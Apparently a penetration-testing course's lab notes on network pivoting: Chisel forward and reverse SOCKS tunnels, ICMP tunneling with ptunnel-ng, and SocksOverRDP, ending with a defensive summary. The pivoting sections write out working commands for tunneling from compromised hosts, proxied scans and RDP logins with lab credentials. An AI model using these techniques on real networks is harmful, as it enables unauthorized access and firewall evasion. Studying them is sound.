- **Goal**: Tunnel traffic to an internal network (172.16.5.0/23) to access the Domain Controller (DC) at 172.16.5.19.
- **Challenge**: Attack host and DC are on different network segments.
- **Solution**: Use a compromised Ubuntu server as a Chisel server to forward traffic to the internal network.

**Steps**:

1. **Cloning Chisel**:
   - **Command**: `git clone https://github.com/jpillora/chisel.git`

2. **Building the Chisel Binary**:
   - **Command**: 
     ```bash
     cd chisel
     go build
     ```
   - **Note**: You need the Go programming language installed to build the binary.

3. **Transferring Binary to Pivot Host**:
   - **Command**:
     ```bash
     scp chisel ubuntu@10.129.202.64:~/
     ```

4. **Starting the Chisel Server (Pivot Host)**:
   - **Command**:
     ```bash
     ./chisel server -v -p 1234 --socks5
     ```
   - **Function**: Listens on port 1234 and forwards connections to the internal network via SOCKS5.

5. **Connecting the Chisel Client (Attack Host)**:
   - **Command**:
     ```bash
     ./chisel client -v 10.129.202.64:1234 socks
     ```

6. **Updating proxychains.conf**:
   - **File location**: `/etc/proxychains.conf`
   - **Add**: `socks5 127.0.0.1 1080`

7. **Pivoting to DC**:
   - **Command**:
     ```bash
     proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
     ```

### Chisel Reverse Pivot

**Scenario**: Firewall restrictions prevent inbound connections to the compromised machine. Use reverse pivoting to connect.

1. **Starting the Chisel Server (Attack Host)**:
   - **Command**:
     ```bash
     sudo ./chisel server --reverse -v -p 1234 --socks5
     ```
   - **Function**: Enables reverse tunneling, listening on port 1234.

2. **Connecting the Chisel Client (Pivot Host)**:
   - **Command**:
     ```bash
     ./chisel client -v 10.10.14.17:1234 R:socks
     ```
   - **Function**: Uses `R:socks` to specify reverse proxying via SOCKS5.

3. **Updating proxychains.conf**:
   - **File location**: `/etc/proxychains.conf`
   - **Add**: `socks5 127.0.0.1 1080`

4. **Pivoting to DC**:
   - **Command**:
     ```bash
     proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
     ```

**Notes**:
- **Benefits**: Securely tunneling data through encrypted channels.
- **Performance & Detection**: Be mindful of file sizes and detection when transferring binaries.

By setting up Chisel this way, you create a secure tunnel that allows you to navigate through network restrictions and reach internal services.

# ICMP Tunneling with SOCKS

**Overview**: 
ICMP tunneling encapsulates traffic within ICMP packets (echo requests/responses). It’s useful for data exfiltration and creating pivot tunnels when ping responses are allowed through a firewall.

### Steps to Setup & Use ptunnel-ng

1. **Cloning ptunnel-ng**:
   - **Command**:
     ```
     git clone https://github.com/utoni/ptunnel-ng.git
     ```
   - **Purpose**: Downloads the ptunnel-ng project repository from GitHub to your local machine.

2. **Building ptunnel-ng**:
   - **Commands**:
     ```bash
     cd ptunnel-ng
     sudo ./autogen.sh
     ```
   - **Purpose**: 
     - `cd ptunnel-ng`: Navigates to the ptunnel-ng directory.
     - `sudo ./autogen.sh`: Runs the autogen.sh script, which prepares the build environment and compiles the ptunnel-ng source code into an executable.

3. **Transferring ptunnel-ng to Pivot Host**:
   - **Command**: 
     ```bash
     scp -r ptunnel-ng ubuntu@10.129.202.64:~/
     ```
   - **Purpose**: Securely copies the ptunnel-ng directory and its contents to the target host (pivot host) using SCP (Secure Copy Protocol).

4. **Starting the ptunnel-ng Server on Pivot Host**:
   - **Commands**: 
     ```bash
     cd ptunnel-ng/src
     sudo ./ptunnel-ng -r10.129.202.64 -R22
     ```
   - **Purpose**: 
     - `cd ptunnel-ng/src`: Navigates to the source directory where the ptunnel-ng executable is located.
     - `sudo ./ptunnel-ng -r10.129.202.64 -R22`: Starts the ptunnel-ng server on the pivot host, which listens for ICMP packets and forwards them to the specified IP and port.

5. **Connecting to ptunnel-ng Server from Attack Host**:
   - **Command**: 
     ```bash
     sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
     ```
   - **Purpose**: 
     - Establishes a connection from the attack host to the ptunnel-ng server on the pivot host.
     - The tunnel allows traffic to be sent through ICMP packets to the pivot host, which then forwards the traffic to the specified remote host and port.

6. **Establishing SSH Connection through ICMP Tunnel**:
   - **Command**: 
     ```bash
     ssh -p2222 -lubuntu 127.0.0.1
     ```
   - **Purpose**: 
     - Establishes an SSH connection to the target through the ICMP tunnel by connecting to the local port 2222, which is mapped to the remote host and port via the tunnel.

### Dynamic Port Forwarding & Proxychains

1. **Enable Dynamic Port Forwarding**:
   - **Command**: 
     ```bash
     ssh -D 9050 -p2222 -lubuntu 127.0.0.1
     ```
   - **Purpose**: 
     - Creates a dynamic port forward on port 9050, allowing you to route traffic through the SSH connection using proxychains or other tools.

2. **Using Proxychains with Nmap**:
   - **Command**: 
     ```bash
     proxychains nmap -sV -sT 172.16.5.19 -p3389
     ```
   - **Purpose**: 
     - Utilizes proxychains to route the Nmap scan through the dynamic port forward, enabling you to scan the internal network targets.

### Network Traffic Analysis

- **Tools**: Use packet analyzers like Wireshark to monitor and analyze the traffic passing through the ICMP tunnel, ensuring it behaves as expected.

### Session Logs & Traffic Stats

- **Monitoring**: ptunnel-ng provides session logs and traffic statistics, which help you confirm that the tunnel is correctly forwarding traffic.

# RDP and SOCKS Tunneling with SocksOverRDP

## Overview
During certain assessments, we might be limited to a Windows network and unable to use SSH for pivoting. In such cases, we rely on tools like SocksOverRDP, which uses Dynamic Virtual Channels (DVC) from the Windows Remote Desktop Service to tunnel packets over RDP connections.

## Tools Needed
- SocksOverRDP x64 Binaries
- Proxifier Portable Binary (`ProxifierPE.zip`)

## Steps to Setup SocksOverRDP

### 1. Download Binaries
Download the necessary binaries to the attack host:
- SocksOverRDP x64 Binaries
- Proxifier Portable Binary

### 2. Transfer Files to Target
Connect to the target using `xfreerdp` and copy `SocksOverRDPx64.zip` to the target.

### 3. Load SocksOverRDP.dll
On the Windows target, load the `SocksOverRDP.dll` using `regsvr32.exe`:
```plaintext
regsvr32.exe SocksOverRDP-Plugin.dll
```

### 4. Connect via RDP
Connect to the target at `172.16.5.19` over RDP using `mstsc.exe` with credentials `victor:pass@123`. You should receive a prompt indicating the SocksOverRDP plugin is enabled and listening on `127.0.0.1:1080`.

### 5. Start SocksOverRDP Server
Transfer `SocksOverRDPx64.zip` or `SocksOverRDP-Server.exe` to `172.16.5.19` and start it with admin privileges:
```plaintext
SocksOverRDP-Server.exe
```

### 6. Confirm SOCKS Listener
On the foothold target, check that the SOCKS listener is started using `netstat`:
```plaintext
netstat -antb | findstr 1080
TCP 127.0.0.1:1080 0.0.0.0:0 LISTENING
```

### 7. Configure Proxifier
Transfer Proxifier portable to the Windows 10 target on the `10.129.x.x` network. Configure Proxifier to forward all packets to `127.0.0.1:1080`. Proxifier will route traffic through the specified host and port.

### 8. Route Traffic via Proxifier
With Proxifier configured and running, start `mstsc.exe` to pivot traffic via `127.0.0.1:1080`, tunneling over RDP to `172.16.5.19`, and routing it to `172.16.6.155` using `SocksOverRDP-server.exe`.

### RDP Performance Considerations
When interacting with our RDP sessions on an engagement, there might be slow performance in a given session, especially if we are managing multiple RDP sessions simultaneously. If this is the case, we can access the Experience tab in mstsc.exe and set **Performance** to **Modem**.

# Detection & Prevention Summary

This section covers key measures for detecting and preventing threats in network environments, focusing on a holistic approach involving people, processes, and technology.

## 1. Setting a Baseline
- **Network Visibility**: Understanding and tracking everything in the network is essential for identifying anomalies like new devices or unusual traffic. Regular audits of DNS records, device backups, application inventories, and network configurations should be done.
- **Network Diagram**: Tools like Netbrain or diagrams.net help visualize and maintain an up-to-date diagram of the network, aiding in troubleshooting and incident response.

## 2. People
- **Human Element**: Users are often the weakest link in security. Enforcing security practices and educating users, especially regarding Bring Your Own Device (BYOD) risks, is crucial. For example, personal devices used for work can introduce malware, compromising both the user and the organization.
- **Authentication**: Multi-factor authentication is critical, especially for administrative access. Educating users on strong authentication practices helps prevent attacks.
- **Security Operations Center (SOC)**: Large organizations should consider a SOC to monitor the network continuously and respond to incidents. A well-defined incident response plan is essential.

## 3. Processes
- **Policies and Procedures**: Defined policies and regular procedures (e.g., asset management, access control, host audits) help maintain network security and accountability.
- **Access Control**: Proper policies for user account management, provisioning/de-provisioning, and multi-factor authentication are necessary.
- **Change Management**: Formal processes for tracking changes in the environment help ensure security configurations are maintained.

## 4. Technology
- **Network Hardening**: Organizations should regularly check for misconfigurations, new vulnerabilities, and patch systems to prevent exploitation.
- **Perimeter Defense**: Understand what needs protection and secure the perimeter. Technologies like next-gen firewalls, VPN access controls, and intrusion detection/prevention systems are key.
- **Internal Defenses**: Segmentation, intrusion detection, and proper access controls can limit lateral movement for attackers. Host-based security measures like IDS/IPS and event logging are also vital for visibility.

## 5. From the Outside Moving In
- Assess security starting from the outside by understanding what is exposed to the internet and implementing strong defenses like firewalls and VPNs.
- **Internal Network Segmentation**: Ensuring that sensitive internal resources are well protected and that only authorized users have access can stop attackers from exploiting vulnerabilities.

---

**In summary**, a robust security posture requires balancing technology, processes, and people. Regular audits, strong authentication, network segmentation, and continuous monitoring are essential for identifying and preventing attacks.
